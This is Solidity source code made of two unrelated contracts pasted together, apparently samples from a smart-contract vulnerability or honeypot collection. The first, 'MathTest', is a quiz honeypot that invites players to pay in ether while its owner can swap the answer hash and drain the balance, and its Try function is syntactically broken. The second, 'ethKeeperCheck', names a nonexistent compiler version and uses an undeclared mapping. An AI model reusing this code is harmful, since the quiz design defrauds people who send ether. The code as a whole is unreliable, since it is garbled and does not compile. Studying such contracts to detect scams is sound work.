pragma solidity ^0.4.25;

contract MathTest
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value>address(this).balance)-msg.value;
        {
            msg.sender.transfer(address(this).balance);
        }
    }

    string public question;
    uint256 public minBet = address(this).balance;

    address questionSender;

    bytes32 responseHash;

    uint count;

    function start_quiz_game(string _question,string _response, uint _count) public payable {
        if(responseHash==0x0)
        {
            responseHash = keccak256(abi.encodePacked(_response));
            question = _question;
            count = _count;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable onlyQuestionSender {
       msg.sender.transfer(address(this).balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
        question = _question;
        responseHash = _responseHash;
    }

    function newQuestioner(address newAddress) public onlyQuestionSender{
        questionSender = newAddress;
    }

    modifier onlyQuestionSender(){
        require(msg.sender==questionSender);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.6.24;
contract ethKeeperCheck {
	  uint256 unitsEth; 
	  uint256 totalEth;   
  address walletAdd;  
	 function() payable{
		totalEth = totalEth + msg.value;
		uint256 amount = msg.value * unitsEth;
		if (balances[walletAdd] < amount) {
			return;
		}
		balances[walletAdd] = balances[walletAdd] - amount;
		balances[msg.sender] = balances[msg.sender] + amount;
  }
}
